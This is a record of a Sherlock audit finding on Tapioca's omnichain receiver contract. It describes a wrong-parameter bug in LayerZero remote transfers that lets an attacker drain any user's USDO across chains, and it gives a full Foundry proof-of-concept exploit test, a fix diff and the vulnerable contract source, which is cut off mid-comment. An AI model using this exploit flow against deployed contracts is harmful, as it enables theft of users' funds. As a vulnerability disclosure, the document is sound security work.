{
  "Title": "H-10: Wrong parameter in remote transfer makes it possible to steal all USDO balance from users",
  "Content": "# Issue H-10: Wrong parameter in remote transfer makes it possible to steal all USDO balance from users \n\nSource: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/111 \n\n## Found by \n0xadrii, ComposableSecurity\n## Summary\nSetting a wrong parameter when performing remote transfers enables an attack flow where USDO can be stolen from users.\n\n## Vulnerability Detail\n\nThe following bug describes a way to leverage  Tapioca’s remote transfers in order to drain any user’s USDO balance. Before diving into the issue, a bit of background regarding compose calls is required in order to properly understand the attack.\n\nTapioca allows users to leverage LayerZero’s [compose calls](https://docs.layerzero.network/contracts/oft-composing), which enable complex interactions between messages sent across chains. Compose messages are always preceded by a sender address in order for the destination chain to understand who the sender of the compose message is. When the compose message is received, `TapiocaOmnichainReceiver.lzCompose()` will decode the compose message, extract the `srcChainSender_` and trigger the internal `_lzCompose()` call with the decoded `srcChainSender_` as the sender:\n\n```solidity\n// TapiocaOmnichainReceiver.sol\nfunction lzCompose(  \n        address _from,\n        bytes32 _guid,\n        bytes calldata _message,\n        address, //executor\n        bytes calldata //extra Data\n    ) external payable override {\n        ...\n   \n        // Decode LZ compose message.\n        (address srcChainSender_, bytes memory oftComposeMsg_) =\n            TapiocaOmnichainEngineCodec.decodeLzComposeMsg(_message);\n\n        // Execute the composed message.  \n        _lzCompose(srcChainSender_, _guid, oftComposeMsg_);  \n    }\n```\n\nOne of the type of compose calls supported in tapioca are remote transfers. When the internal `_lzCompose()` is triggered, users who specify a msgType equal to `MSG_REMOTE_TRANSFER` will make the `_remoteTransferReceiver()` internal call be executed:\n\n```solidity\n// TapiocaOmnichainReceiver.sol\nfunction _lzCompose(address srcChainSender_, bytes32 _guid, bytes memory oftComposeMsg_) internal {\n        // Decode OFT compose message.\n        (uint16 msgType_,,, bytes memory tapComposeMsg_, bytes memory nextMsg_) =\n            TapiocaOmnichainEngineCodec.decodeToeComposeMsg(oftComposeMsg_);\n\n        // Call Permits/approvals if the msg type is a permit/approval.\n        // If the msg type is not a permit/approval, it will call the other receivers. \n        if (msgType_ == MSG_REMOTE_TRANSFER) {   \n            _remoteTransferReceiver(srcChainSender_, tapComposeMsg_);   \n\n\t\t\t...\n\n}\n```\n\nRemote transfers allow users to burn tokens in one chain and mint them in another chain by executing a recursive `_lzSend()` call. In order to burn the tokens, they will first be transferred from an **arbitrary owner set by the function caller** via the `_internalTransferWithAllowance()` function.\n\n```solidity\n// TapiocaOmnichainReceiver.sol\n\nfunction _remoteTransferReceiver(address _srcChainSender, bytes memory _data) internal virtual {\n        RemoteTransferMsg memory remoteTransferMsg_ = TapiocaOmnichainEngineCodec.decodeRemoteTransferMsg(_data);\n\n        /// @dev xChain owner needs to have approved dst srcChain `sendPacket()` msg.sender in a previous composedMsg. Or be the same address.\n        _internalTransferWithAllowance(\n            remoteTransferMsg_.owner, _srcChainSender, remoteTransferMsg_.lzSendParam.sendParam.amountLD\n        );  \n          \n        // Make the internal transfer, burn the tokens from this contract and send them to the recipient on the other chain.\n        _internalRemoteTransferSendPacket(\n            remoteTransferMsg_.owner, \n            remoteTransferMsg_.lzSendParam, \n            remoteTransferMsg_.composeMsg \n        ); \n      \n        ...\n    }\n```\n\nAfter transferring the tokens via `_internalTransferWithAllowance()`, `_internalRemoteTransferSendPacket()` will be triggered, which is the function that will actually burn the tokens and execute the recursive `_lzSend()` call:\n\n```solidity\n// TapiocaOmnichainReceiver.sol\n\nfunction _internalRemoteTransferSendPacket(    \n        address _srcChainSender,\n        LZSendParam memory _lzSendParam,   \n        bytes memory _composeMsg\n    ) internal returns (MessagingReceipt memory msgReceipt, OFTReceipt memory oftReceipt) {\n        // Burn tokens from this contract\n        (uint256 amountDebitedLD_, uint256 amountToCreditLD_) = _debitView(\n            _lzSendParam.sendParam.amountLD, _lzSendParam.sendParam.minAmountLD, _lzSendParam.sendParam.dstEid \n        );   \n        _burn(address(this), amountToCreditLD_); \n   \n        ...\n      \n        // Builds the options and OFT message to quote in the endpoint.\n        (bytes memory message, bytes memory options) = _buildOFTMsgAndOptionsMemory(\n            _lzSendParam.sendParam, _lzSendParam.extraOptions, _composeMsg, amountToCreditLD_, _srcChainSender \n        ); // msgSender is the sender of the composed message. We keep context by passing `_srcChainSender`.\n    \n        // Sends the message to the LayerZero endpoint and returns the LayerZero msg receipt.\n        msgReceipt =\n            _lzSend(_lzSendParam.sendParam.dstEid, message, options, _lzSendParam.fee, _lzSendParam.refundAddress);\n        ...\n    }\n```\n\nAs we can see, the `_lzSend()` call performed inside `_internalRemoteTransferSendPacket()` allows to trigger the remote call with another compose message (built using the `_buildOFTMsgAndOptionsMemory()` function). If there is an actual `_composeMsg` to be appended, the sender of such message will be set to the `_internalRemoteTransferSendPacket()` function’s `_srcChainSender` parameter.\n\nThe problem is that when `_internalRemoteTransferSendPacket()` is called, the parameter passed as the source chain sender is set to the **arbitrary owner address** supplied by the caller in the initial compose call, instead of the actual source chain sender:\n\n```solidity\n// TapiocaOmnichainReceiver.sol\n\nfunction _remoteTransferReceiver(address _srcChainSender, bytes memory _data) internal virtual {\n        ...\n          \n        // Make the internal transfer, burn the tokens from this contract and send them to the recipient on the other chain.\n        _internalRemoteTransferSendPacket(\n            remoteTransferMsg_.owner,  // <------ This parameter will become the _srcChainSender in the recursive compose message call\n            remoteTransferMsg_.lzSendParam, \n            remoteTransferMsg_.composeMsg \n        ); \n      \n        ...\n    }\n```\n\nThis makes it possible for an attacker to create an attack vector that allows to drain any user’s USDO balance. The attack path is as follows:\n\n1. Execute a remote call from chain A to chain B. This call has a compose message that will be triggered in chain B.\n    1. The remote transfer message will set the arbitrary `owner` to any victim’s address. It is important to also set the amount to be transferred in this first compose call to 0 so that the attacker can bypass the allowance check performed inside the `_remoteTransferReceiver()` call.\n2. When the compose call gets executed, a second packed compose message will be built and triggered inside `_internalRemoteTransferSendPacket()`. This second compose message will be sent from chain B to chain A, and the source chain sender will be set to the arbitrary `owner` address that the attacker wants to drain due to the incorrect parameter being passed. It will also be a remote transfer action.\n3. When chain A receives the compose message, a third compose will be triggered. This third compose is where the token transfers will take place. Inside the `_lzReceive()` triggered in chain A, the composed message will instruct to transfer and burn a certain amount of tokens (selected by the attacker when crafting the attack). Because the source chain sender is the victim address and the `owner` specified is also the victim, the `_internalTransferWithAllowance()` executed in chain A will not check for allowances because the owner and the spender are the same address (the victim’s address). This will burn the attacker’s desired amount from the victim’s wallet.\n4. Finally, a last `_lzSend()` will be triggered to chain B, where the burnt tokens in chain A will be minted. Because the compose calls allow to set a specific recipient address, the receiver of the minted tokens will be the `attacker`.\n\nAs a summary: the attack allows to combine several compose calls recursively so that an attacker can burn victim’s tokens in Chain A, and mint them in chain B to a desired address. The following diagram summarizes the attack for clarity:\n\n![attack](https://github.com/sherlock-audit/2024-02-tapioca-0xadrii/assets/56537955/85be7502-808d-47c5-b635-dd2b8618ca8f)\n\n## Proof of concept\n\nThe following proof of concept illustrates how the mentioned attack can take place. In order to execute the PoC, the following steps must be performed:\n\n1. Create an `EnpointMock.sol` file inside the `test` folder inside `Tapioca-bar` and paste the following code (the current tests are too complex, this imitates LZ’s endpoint contracts and reduces the poc’s complexity):\n\n```solidity\n// SPDX-License-Identifier: LZBL-1.2\n\npragma solidity ^0.8.20;\n\nstruct MessagingReceipt {\n    bytes32 guid;\n    uint64 nonce;\n    MessagingFee fee;\n}\n\nstruct MessagingParams {\n    uint32 dstEid;\n    bytes32 receiver;\n    bytes message;\n    bytes options; \n    bool payInLzToken;\n}\n\nstruct MessagingFee {\n    uint256 nativeFee;\n    uint256 lzTokenFee;\n}\ncontract MockEndpointV2  {\n\n  \n    function send(\n        MessagingParams calldata _params,\n        address _refundAddress\n    ) external payable  returns (MessagingReceipt memory receipt) {\n        // DO NOTHING\n    }\n\n    /// @dev the Oapp sends the lzCompose message to the endpoint\n    /// @dev the composer MUST assert the sender because anyone can send compose msg with this function\n    /// @dev with the same GUID, the Oapp can send compose to multiple _composer at the same time\n    /// @dev authenticated by the msg.sender\n    /// @param _to the address which will receive the composed message\n    /// @param _guid the message guid\n    /// @param _message the message\n    function sendCompose(address _to, bytes32 _guid, uint16 _index, bytes calldata _message) external {\n         // DO NOTHING\n        \n    }\n  \n}\n\n```\n\n1. Import and deploy two mock endpoints in the `Usdo.t.sol` file\n2. Change the inherited OApp in `Usdo.sol` ’s implementation so that the endpoint variable is not immutable and add a `setEndpoint()` function so that the endpoint configured in `setUp()` can be chainged to the newly deployed endpoints\n3. Paste the following test insde `Usdo.t.sol` :\n\n```solidity\nfunction testVuln_stealUSDOFromATargetUserDueToWrongParameter() public {\n\n        // Change configured enpoints\n\n        endpoints[aEid] = address(mockEndpointV2A);\n        endpoints[bEid] = address(mockEndpointV2B);\n\n        aUsdo.setEndpoint(address(mockEndpointV2A));\n        bUsdo.setEndpoint(address(mockEndpointV2B));\n\n        \n        \n        deal(address(aUsdo), makeAddr(\"victim\"), 100 ether);\n\n        ////////////////////////////////////////////////////////\n        //                 PREPARE MESSAGES                   //\n        ////////////////////////////////////////////////////////\n\n        // FINAL MESSAGE    A ---> B                  \n\n        SendParam memory sendParamAToBVictim = SendParam({\n            dstEid: bEid,\n            to: OFTMsgCodec.addressToBytes32(makeAddr(\"attacker\")),\n            amountLD: 100 ether, // IMPORTANT: This must be set to the amount we want to steal\n            minAmountLD: 100 ether,\n            extraOptions: bytes(\"\"),\n            composeMsg: bytes(\"\"),\n            oftCmd: bytes(\"\")\n        });  \n        MessagingFee memory feeAToBVictim = MessagingFee({\n            nativeFee: 0,\n            lzTokenFee: 0\n        });\n        \n        LZSendParam memory lzSendParamAToBVictim = LZSendParam({\n            sendParam: sendParamAToBVictim,\n            fee: feeAToBVictim,\n            extraOptions: bytes(\"\"),\n            refundAddress: makeAddr(\"attacker\")\n        });\n\n        RemoteTransferMsg memory remoteTransferMsgVictim = RemoteTransferMsg({\n            owner: makeAddr(\"victim\"), // IMPORTANT: This will make the attack be triggered as the victim will become the srcChainSender in the destination chain\n            composeMsg: bytes(\"\"),\n            lzSendParam: lzSendParamAToBVictim\n        });\n\n        uint16 index; // needed to bypass Solidity's encoding literal error\n        // Create Toe Compose message for the victim\n        bytes memory toeComposeMsgVictim = abi.encodePacked(\n            PT_REMOTE_TRANSFER, // msgType\n            uint16(abi.encode(remoteTransferMsgVictim).length), // message length (0)\n            index, // index\n            abi.encode(remoteTransferMsgVictim), // message\n            bytes(\"\") // next message\n        );\n\n        // SECOND MESSAGE     B ---> A                 \n\n        SendParam memory sendParamBToA = SendParam({\n            dstEid: aEid,\n            to: OFTMsgCodec.addressToBytes32(makeAddr(\"attacker\")),\n            amountLD: 0, // IMPORTANT: This must be set to 0 to bypass the allowance check performed inside `_remoteTransferReceiver()`\n            minAmountLD: 0,\n            extraOptions: bytes(\"\"),\n            composeMsg: bytes(\"\"),\n            oftCmd: bytes(\"\")\n        });  \n        MessagingFee memory feeBToA = MessagingFee({\n            nativeFee: 0,\n            lzTokenFee: 0\n        });\n        \n        LZSendParam memory lzSendParamBToA = LZSendParam({\n            sendParam: sendParamBToA,\n            fee: feeBToA,\n            extraOptions: bytes(\"\"),\n            refundAddress: makeAddr(\"attacker\")\n        });\n\n        // Create remote transfer message\n        RemoteTransferMsg memory remoteTransferMsg = RemoteTransferMsg({\n            owner: makeAddr(\"victim\"), // IMPORTANT: This will make the attack be triggered as the victim will become the srcChainSender in the destination chain\n            composeMsg: toeComposeMsgVictim,\n            lzSendParam: lzSendParamBToA\n        });\n\n        // Create Toe Compose message\n        bytes memory toeComposeMsg = abi.encodePacked(\n            PT_REMOTE_TRANSFER, // msgType\n            uint16(abi.encode(remoteTransferMsg).length), // message length\n            index, // index\n            abi.encode(remoteTransferMsg),\n            bytes(\"\") // next message\n        );\n         \n        // INITIAL MESSAGE       A ---> B                      \n\n        // Create `_lzSendParam` parameter for `sendPacket()`\n        SendParam memory sendParamAToB = SendParam({\n            dstEid: bEid,\n            to: OFTMsgCodec.addressToBytes32(makeAddr(\"attacker\")),\n            amountLD: 0,\n            minAmountLD: 0,\n            extraOptions: bytes(\"\"),\n            composeMsg: bytes(\"\"),\n            oftCmd: bytes(\"\")\n        });  \n        MessagingFee memory feeAToB = MessagingFee({\n            nativeFee: 0,\n            lzTokenFee: 0\n        });\n        \n        LZSendParam memory lzSendParamAToB = LZSendParam({\n            sendParam: sendParamAToB,\n            fee: feeAToB,\n            extraOptions: bytes(\"\"),\n            refundAddress: makeAddr(\"attacker\")\n        });\n\n        vm.startPrank(makeAddr(\"attacker\"));\n        aUsdo.sendPacket(lzSendParamAToB, toeComposeMsg);\n\n        // EXECUTE ATTACK\n\n        // Execute first lzReceive() --> receive message in chain B\n    \n        vm.startPrank(endpoints[bEid]);\n        UsdoReceiver(address(bUsdo)).lzReceive(\n            Origin({sender: OFTMsgCodec.addressToBytes32(address(aUsdo)), srcEid: aEid, nonce: 0}), \n            OFTMsgCodec.addressToBytes32(address(0)), // guid (not needed for the PoC)\n            abi.encodePacked( // same as _buildOFTMsgAndOptions()\n                sendParamAToB.to,\n                 index,  // amount (use an initialized 0 variable due to Solidity restrictions)\n                 OFTMsgCodec.addressToBytes32(makeAddr(\"attacker\")),\n                toeComposeMsg\n            ), // message\n            address(0), // executor (not used)\n            bytes(\"\") // extra data (not used)\n        );\n\n        // Compose message is sent in `lzReceive()`, we need to trigger `lzCompose()`.\n        // This triggers a message back to chain A, in which the srcChainSender will be set as the victim inside the\n        // composed message due to the wrong parameter passed\n        UsdoReceiver(address(bUsdo)).lzCompose(\n            address(bUsdo), \n            OFTMsgCodec.addressToBytes32(address(0)), // guid (not needed for the PoC)\n            abi.encodePacked(OFTMsgCodec.addressToBytes32(address(aUsdo)), toeComposeMsg), // message\n            address(0), // executor (not used)\n            bytes(\"\") // extra data (not used)\n        );\n\n        vm.startPrank(endpoints[aEid]);\n\n        // Chain A: message is received, internally a compose flow is retriggered.\n        UsdoReceiver(address(aUsdo)).lzReceive(\n            Origin({sender: OFTMsgCodec.addressToBytes32(address(bUsdo)), srcEid: bEid, nonce: 0}), \n            OFTMsgCodec.addressToBytes32(address(0)), // guid (not needed for the PoC)\n            abi.encodePacked( // same as _buildOFTMsgAndOptions()\n                sendParamAToB.to,\n                 index,  // amount\n                 OFTMsgCodec.addressToBytes32(makeAddr(\"attacker\")),\n                toeComposeMsgVictim\n            ), // message\n            address(0), // executor (not used)\n            bytes(\"\") // extra data (not used)\n        );\n\n        // Compose message is sent in `lzReceive()`, we need to trigger `lzCompose()`.\n        // At this point, the srcChainSender is the victim (as set in the previous lzCompose) because of the wrong parameter (the `expectEmit` verifies it).\n        // The `owner` specified for the remote transfer is also the victim, so the allowance check is bypassed because `owner` == `srcChainSender`.\n        // This allows the tokens to be burnt, and a final message is triggered to the destination chain\n        UsdoReceiver(address(aUsdo)).lzCompose(\n            address(aUsdo), \n            OFTMsgCodec.addressToBytes32(address(0)), // guid (not needed for the PoC)\n            abi.encodePacked(OFTMsgCodec.addressToBytes32(address(makeAddr(\"victim\"))), toeComposeMsgVictim), // message (srcChainSender becomes victim because of wrong parameter set)\n            address(0), // executor (not used)\n            bytes(\"\") // extra data (not used)\n        );\n\n        // Back to chain B. Finally, the burnt tokens from the victim in chain A get minted in chain B with the attacker set as the destination\n        {\n            uint64 tokenAmountSD = usdoHelper.toSD(100 ether, bUsdo.decimalConversionRate());\n            \n            vm.startPrank(endpoints[bEid]);\n            UsdoReceiver(address(bUsdo)).lzReceive(\n                Origin({sender: OFTMsgCodec.addressToBytes32(address(aUsdo)), srcEid: aEid, nonce: 0}), \n                OFTMsgCodec.addressToBytes32(address(0)), // guid (not needed for the PoC)\n                abi.encodePacked( // same as _buildOFTMsgAndOptions()\n                   OFTMsgCodec.addressToBytes32(makeAddr(\"attacker\")),\n                    tokenAmountSD\n                ), // message\n                address(0), // executor (not used)\n                bytes(\"\") // extra data (not used)\n            );\n\n        }\n\n        // Finished: victim gets drained, attacker obtains balance of victim\n        assertEq(bUsdo.balanceOf(makeAddr(\"victim\")), 0);\n        assertEq(bUsdo.balanceOf(makeAddr(\"attacker\")), 100 ether);\n          \n    } \n```\n\nRun the poc with the following command: `forge test --mt testVuln_stealUSDOFromATargetUserDueToWrongParameter`\n\nThe proof of concept shows how in the end, the victim’s `aUsdo` balance will become 0, while all the `bUsdo` in chain B will be minted to the attacker.\n\n\n## Impact\n\nHigh. An attacker can drain any USDO holder’s balance and transfer it to themselves.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2024-02-tapioca/blob/main/Tapioca-bar/gitmodule/tapioca-periph/contracts/tapiocaOmnichainEngine/TapiocaOmnichainReceiver.sol#L224\n\n## Tool used\n\nManual Review, foundry\n\n## Recommendation\n\nChange the parameter passed in the `_internalRemoteransferSendPacket()` call so that the sender in the compose call built inside it is actually the real source chain sender. This will make it be kept along all the possible recursive calls that might take place:\n\n```diff\nfunction _remoteTransferReceiver(address _srcChainSender, bytes memory _data) internal virtual {\n        RemoteTransferMsg memory remoteTransferMsg_ = TapiocaOmnichainEngineCodec.decodeRemoteTransferMsg(_data);\n\n        /// @dev xChain owner needs to have approved dst srcChain `sendPacket()` msg.sender in a previous composedMsg. Or be the same address.\n        _internalTransferWithAllowance(\n            remoteTransferMsg_.owner, _srcChainSender, remoteTransferMsg_.lzSendParam.sendParam.amountLD\n        );  \n          \n        // Make the internal transfer, burn the tokens from this contract and send them to the recipient on the other chain.\n        _internalRemoteTransferSendPacket(\n-            remoteTransferMsg_.owner,\n+           _srcChainSender\n            remoteTransferMsg_.lzSendParam, \n            remoteTransferMsg_.composeMsg \n        ); \n      \n        emit RemoteTransferReceived(\n            remoteTransferMsg_.owner,\n            remoteTransferMsg_.lzSendParam.sendParam.dstEid,\n            OFTMsgCodec.bytes32ToAddress(remoteTransferMsg_.lzSendParam.sendParam.to),\n            remoteTransferMsg_.lzSendParam.sendParam.amountLD\n        );\n    }\n```\n\n\n\n## Discussion\n\n**sherlock-admin3**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**takarez** commented:\n>  seem valid; high(6)\n\n\n\n**sherlock-admin4**\n\nThe protocol team fixed this issue in PR/commit https://github.com/Tapioca-DAO/tapioca-periph/pull/200.\n\n",
  "Impact": "HIGH",
  "Source": "https://app.sherlock.xyz/audits/contests/170",
  "Code": [
    {
      "filename": "Tapioca-bar/gitmodule/tapioca-periph/contracts/tapiocaOmnichainEngine/TapiocaOmnichainReceiver.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.22;\n\n// LZ\nimport {\n    MessagingReceipt, OFTReceipt, SendParam\n} from \"@layerzerolabs/lz-evm-oapp-v2/contracts/oft/interfaces/IOFT.sol\";\nimport {IOAppMsgInspector} from \"@layerzerolabs/lz-evm-oapp-v2/contracts/oapp/interfaces/IOAppMsgInspector.sol\";\nimport {IOAppComposer} from \"@layerzerolabs/lz-evm-oapp-v2/contracts/oapp/interfaces/IOAppComposer.sol\";\nimport {OFTMsgCodec} from \"@layerzerolabs/lz-evm-oapp-v2/contracts/oft/libs/OFTMsgCodec.sol\";\nimport {Origin} from \"@layerzerolabs/lz-evm-oapp-v2/contracts/oapp/OApp.sol\";\nimport {OFT} from \"@layerzerolabs/lz-evm-oapp-v2/contracts/oft/OFT.sol\";\n\n// Tapioca\nimport {\n    ITapiocaOmnichainReceiveExtender,\n    ERC721PermitApprovalMsg,\n    ERC20PermitApprovalMsg,\n    RemoteTransferMsg,\n    LZSendParam\n} from \"tapioca-periph/interfaces/periph/ITapiocaOmnichainEngine.sol\";\nimport {TapiocaOmnichainEngineCodec} from \"./TapiocaOmnichainEngineCodec.sol\";\nimport {BaseTapiocaOmnichainEngine} from \"./BaseTapiocaOmnichainEngine.sol\";\n\n/*\n\n████████╗ █████╗ ██████╗ ██╗ ██████╗  ██████╗ █████╗ \n╚══██╔══╝██╔══██╗██╔══██╗██║██╔═══██╗██╔════╝██╔══██╗\n   ██║   ███████║██████╔╝██║██║   ██║██║     ███████║\n   ██║   ██╔══██║██╔═══╝ ██║██║   ██║██║     ██╔══██║\n   ██║   ██║  ██║██║     ██║╚██████╔╝╚██████╗██║  ██║\n   ╚═╝   ╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝\n   \n*/\n\nabstract contract TapiocaOmnichainReceiver is BaseTapiocaOmnichainEngine, IOAppComposer {\n    using OFTMsgCodec for bytes;\n    using OFTMsgCodec for bytes32;\n\n    /**\n     *  @dev Triggered if the address of the composer doesn't match current contract in `lzCompose`.\n     * Compose caller and receiver are the same address, which is this.\n     */\n    error InvalidComposer(address composer);\n    error InvalidCaller(address caller); // Should be the endpoint address\n    error InvalidMsgType(uint16 msgType); // Triggered if the msgType is invalid on an `_lzCompose`.\n\n    /// @dev Compose received.\n    event ComposeReceived(uint16 indexed msgType, bytes32 indexed guid, bytes composeMsg);\n    /// @dev twTAP unlock operation received.\n    event RemoteTransferReceived(address indexed owner, uint256 indexed dstEid, address indexed to, uint256 amount);\n\n    /**\n     * @dev !!! FIRST ENTRYPOINT, COMPOSE MSG ARE TO BE BUILT HERE  !!!\n     *\n     * @dev Slightly modified version of the OFT _lzReceive() operation.\n     * The composed message is sent to `address(this)` instead of `toAddress`.\n     * @dev Internal function to handle the receive on the LayerZero endpoint.\n     * @dev Caller is verified on the public function. See `OAppReceiver.lzReceive()`.\n     *\n     * @param _origin The origin information.\n     *  - srcEid: The source chain endpoint ID.\n     *  - sender: The sender address from the src chain.\n     *  - nonce: The nonce of the LayerZero message.\n     * @param _guid The unique identifier for the received LayerZero message.\n     * @param _message The encoded message.\n     * _executor The address of the executor.\n     * _extraData Additional data.\n     */\n    // TODO check if OApp sender is sanitized?\n    // TODO !!!!!!!!! Perform ld2sd conversion on the compose messages amounts.\n    function _lzReceive(\n        Origin calldata _origin,\n        bytes32 _guid,\n        bytes calldata _message,\n        address, /*_executor*/ // @dev unused in the default implementation.\n        bytes calldata /*_extraData*/ // @dev unused in the default implementation.\n    ) internal virtual override {\n        // @dev The src sending chain doesn't know the address length on this chain (potentially non-evm)\n        // Thus everything is bytes32() encoded in flight.\n        address toAddress = _message.sendTo().bytes32ToAddress();\n        // @dev Convert the amount to credit into local decimals.\n        uint256 amountToCreditLD = _toLD(_message.amountSD());\n        // @dev Credit the amount to the recipient and return the ACTUAL amount the recipient received in local decimals\n        uint256 amountReceivedLD = _credit(toAddress, amountToCreditLD, _origin.srcEid);\n\n        if (_message.isComposed()) {\n            // @dev Stores the lzCompose payload that will be executed in a separate tx.\n            // Standardizes functionality for executing arbitrary contract invocation on some non-evm chains.\n            // @dev The off-chain executor will listen and process the msg based on the src-chain-callers compose options passed.\n            // @dev The index is used when a OApp needs to compose multiple msgs on lzReceive.\n            // For default OFT implementation there is only 1 compose msg per lzReceive, thus its always 0.\n            endpoint.sendCompose(\n                address(this), // Updated from default `toAddress`\n                _guid,\n                0, /* the index of the composed message*/\n                _message.composeMsg()\n            );\n        }\n\n        emit OFTReceived(_guid, _origin.srcEid, toAddress, amountReceivedLD);\n    }\n\n    // TODO - SANITIZE MSG TYPE\n    /**\n     * @dev !!! SECOND ENTRYPOINT, CALLER NEEDS TO BE VERIFIED !!!\n     *\n     * @notice Composes a LayerZero message from an OApp.\n     * @dev The message comes in form:\n     *      - [composeSender::address][oftComposeMsg::bytes]\n     *                                          |\n     *                                          |\n     *                        [msgType::uint16, composeMsg::bytes]\n     * @dev The composeSender is the user that initiated the `sendPacket()` call on the srcChain.\n     *\n     * @param _from The address initiating the composition, typically the OApp where the lzReceive was called.\n     * @param _guid The unique identifier for the corresponding LayerZero src/dst tx.\n     * @param _message The composed message payload in bytes. NOT necessarily the same payload passed via lzReceive.\n     */\n    function lzCompose(\n        address _from,\n        bytes32 _guid,\n        bytes calldata _message,\n        address, //executor\n        bytes calldata //extra Data\n    ) external payable override {\n        // Validate the from and the caller.\n        if (_from != address(this)) {\n            revert InvalidComposer(_from);\n        }\n        if (msg.sender != address(endpoint)) {\n            revert InvalidCaller(msg.sender);\n        }\n\n        // Decode LZ compose message.\n        (address srcChainSender_, bytes memory oftComposeMsg_) =\n            TapiocaOmnichainEngineCodec.decodeLzComposeMsg(_message);\n        // Execute the composed message.\n        _lzCompose(srcChainSender_, _guid, oftComposeMsg_);\n    }\n\n    /**\n     * @dev Modifier behavior of composed calls to be executed as a single Tx.\n     * Since composed msgs and approval\n     */\n    function _lzCompose(address srcChainSender_, bytes32 _guid, bytes memory oftComposeMsg_) internal {\n        // Decode OFT compose message.\n        (uint16 msgType_,,, bytes memory tapComposeMsg_, bytes memory nextMsg_) =\n            TapiocaOmnichainEngineCodec.decodeToeComposeMsg(oftComposeMsg_);\n\n        // Call Permits/approvals if the msg type is a permit/approval.\n        // If the msg type is not a permit/approval, it will call the other receivers.\n        if (msgType_ == MSG_REMOTE_TRANSFER) {\n            _remoteTransferReceiver(srcChainSender_, tapComposeMsg_);\n        } else if (!_extExec(msgType_, tapComposeMsg_)) {\n            // Check if the TOE extender is set and the msg type is valid. If so, call the TOE extender to handle msg.\n            if (\n                address(tapiocaOmnichainReceiveExtender) != address(0)\n                    && tapiocaOmnichainReceiveExtender.isMsgTypeValid(msgType_)\n            ) {\n                bytes memory callData = abi.encodeWithSelector(\n                    ITapiocaOmnichainReceiveExtender.toeComposeReceiver.selector,\n                    msgType_,\n                    srcChainSender_,\n                    tapComposeMsg_\n                );\n                (bool success, bytes memory returnData) =\n                    address(tapiocaOmnichainReceiveExtender).delegatecall(callData);\n                if (!success) {\n                    revert(_getTOEExtenderRevertMsg(returnData));\n                }\n            } else {\n                // If no TOE extender is set or msg type doesn't match extender, try to call the internal receiver.\n                if (!_toeComposeReceiver(msgType_, srcChainSender_, tapComposeMsg_)) {\n                    revert InvalidMsgType(msgType_);\n                }\n            }\n        }\n\n        emit ComposeReceived(msgType_, _guid, tapComposeMsg_);\n        if (nextMsg_.length > 0) {\n            _lzCompose(address(this), _guid, nextMsg_);\n        }\n    }\n\n    // ********************* //\n    // ***** RECEIVERS ***** //\n    // ********************* //\n\n    /**\n     * @dev Meant to be override by TOE contracts, such as tOFT or TapToken, to handle their own msg types.\n     *\n     * @param _msgType is the msgType of the composed message. See `TapiocaOmnichainEngineCodec.decodeToeComposeMsg()`.\n     * See `BaseTapiocaOmnichainEngine` to see the default TOE messages types.\n     * @param _srcChainSender The address of the sender on the source chain.\n     * @param _toeComposeMsg is the composed message payload, of whatever the _msgType handler is expecting.\n     * @return success is the success of the composed message handler. If no handler is found, it should return false to trigger `InvalidMsgType()`.\n     */\n    function _toeComposeReceiver(uint16 _msgType, address _srcChainSender, bytes memory _toeComposeMsg)\n        internal\n        virtual\n        returns (bool success)\n    {}\n\n    /**\n     * // TODO Check if it's safe to send composed messages too.\n     * // TODO Write test for composed messages call. A->B->A-B/C?\n     * @dev Transfers tokens AND composed messages from this contract to the recipient on the chain A. Flow of calls is: A->B->A.\n     * @dev The user needs to have approved the TapToken contract to spend the TAP.\n     *\n     * @param _srcChainSender The address of the sender on the source chain.\n     * @param _data The call data containing info about the transfer (LZSendParam).\n     */\n    function _remoteTransferReceiver(address _srcChainSender, bytes memory _data) internal virtual {\n        RemoteTransferMsg memory remoteTransferMsg_ = TapiocaOmnichainEngineCodec.decodeRemoteTransferMsg(_data);\n\n        /// @dev xChain owner needs to have approved dst srcChain `sendPacket()` msg.sender in a previous composedMsg. Or be the same address.\n        _internalTransferWithAllowance(\n            remoteTransferMsg_.owner, _srcChainSender, remoteTransferMsg_.lzSendParam.sendParam.amountLD\n        );\n\n        // Make the internal transfer, burn the tokens from this contract and send them to the recipient on the other chain.\n        _internalRemoteTransferSendPacket(\n            remoteTransferMsg_.owner, remoteTransferMsg_.lzSendParam, remoteTransferMsg_.composeMsg\n        );\n\n        emit RemoteTransferReceived(\n            remoteTransferMsg_.owner,\n            remoteTransferMsg_.lzSendParam.sendParam.dstEid,\n            OFTMsgCodec.bytes32ToAddress(remoteTransferMsg_.lzSendParam.sendParam.to),\n            remoteTransferMsg_.lzSendParam.sendParam.amountLD\n        );\n    }\n\n    /**\n     * // TODO review this function.\n     *\n     * @dev Slightly modified version of the OFT _sendPacket() operation. To accommodate the `srcChainSender` parameter and potential dust.\n     * @dev !!! IMPORTANT !!! made ONLY for the `_remoteTransferReceiver()` operation.\n     */\n    function _internalRemoteTransferSendPacket(\n        address _srcChainSender,\n        LZSendParam memory _lzSendParam,\n        bytes memory _composeMsg\n    ) internal returns (MessagingReceipt memory msgReceipt, OFTReceipt memory oftReceipt) {\n        // Burn tokens from this contract\n        (uint256 amountDebitedLD_, uint256 amountToCreditLD_) = _debitView(\n            _lzSendParam.sendParam.amountLD, _lzSendParam.sendParam.minAmountLD, _lzSendParam.sendParam.dstEid\n        );\n        _burn(address(this), amountToCreditLD_);\n\n        _lzSendParam.sendParam.amountLD = amountToCreditLD_;\n        _lzSendParam.sendParam.minAmountLD = amountToCreditLD_;\n\n        // If the srcChain amount request is bigger than the debited one, overwrite the amount to credit with the amount debited and send the difference back to the user.\n        if (_lzSendParam.sendParam.amountLD > amountDebitedLD_) {\n            // Overwrite the amount to credit with the amount debited\n            _lzSendParam.sendParam.amountLD = amountDebitedLD_;\n            _lzSendParam.sendParam.minAmountLD = amountDebitedLD_;\n            // Send the difference back to the user\n            _transfer(address(this), _srcChainSender, _lzSendParam.sendParam.amountLD - amountDebitedLD_);\n        }\n\n        // Builds the options and OFT message to quote in the endpoint.\n        (bytes memory message, bytes memory options) = _buildOFTMsgAndOptionsMemory(\n            _lzSendParam.sendParam, _lzSendParam.extraOptions, _composeMsg, amountToCreditLD_, _srcChainSender\n        ); // msgSender is the sender of the composed message. We keep context 